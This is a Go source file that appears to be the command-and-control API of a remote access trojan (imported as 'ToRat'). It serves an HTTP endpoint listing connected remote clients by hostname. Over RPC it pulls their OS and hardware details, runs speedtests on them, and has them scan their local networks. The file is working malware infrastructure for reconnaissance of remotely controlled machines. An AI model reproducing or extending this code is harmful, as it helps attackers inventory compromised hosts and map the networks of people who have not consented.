package server

import (
	"fmt"
	"log"

	"github.com/JustinTimperio/gomap"
	"github.com/labstack/echo/v4"
	"github.com/lu4p/ToRat/shared"
)

func APIServer() {
	e := echo.New()

	clients := e.Group("/clients")
	clients.GET("", getClients)
	clients.GET("/:id/osinfo", getClientOSInfo)
	clients.GET("/:id/hardware", getClientHardware)
	clients.GET("/:id/speedtest", getClientSpeedtest)
	clients.GET("/:id/netscan", getClientNetscan)

	fmt.Println("api routes:")
	for _, route := range e.Routes() {
		fmt.Println(route.Method, "http://localhost:8000"+route.Path)
	}

	log.Fatal(e.Start(":8000"))
}

func getClientIDs() []string {
	var clients []string
	for _, c := range activeClients {
		clients = append(clients, c.Hostname)
	}
	return clients
}

func getActiveClientByID(id string) (*activeClient, error) {
	for _, c := range activeClients {
		if c.Hostname == id {
			return &c, nil
		}
	}
	return nil, fmt.Errorf("no client found with ID %s", id)
}

func getClientHardware(c echo.Context) error {
	ac, err := getActiveClientByID(c.Param("id"))
	if err != nil {
		return err
	}

	hardware := shared.Hardware{}
	if err := ac.RPC.Call("API.GetHardware", void, &hardware); err != nil {
		return err
	}

	return c.JSON(200, &hardware)
}

func getClientOSInfo(c echo.Context) error {
	ac, err := getActiveClientByID(c.Param("id"))
	if err != nil {
		return err
	}

	osinfo := shared.OSInfo{}
	if err := ac.RPC.Call("API.GetOSInfo", void, &osinfo); err != nil {
		return err
	}

	return c.JSON(200, &osinfo)
}

func getClientSpeedtest(c echo.Context) error {
	ac, err := getActiveClientByID(c.Param("id"))
	if err != nil {
		return err
	}

	speedtest := shared.Speedtest{}
	if err := ac.RPC.Call("API.Speedtest", void, &speedtest); err != nil {
		return err
	}

	return c.JSON(200, &speedtest)
}

func getClientNetscan(c echo.Context) error {
	ac, err := getActiveClientByID(c.Param("id"))
	if err != nil {
		return err
	}

	var network gomap.RangeScanResult
	if err := ac.RPC.Call("API.GomapLocal", void, &network); err != nil {
		return err
	}

	return c.JSON(200, network)
}

func getClients(c echo.Context) error {
	return c.JSON(200, getClientIDs())
}
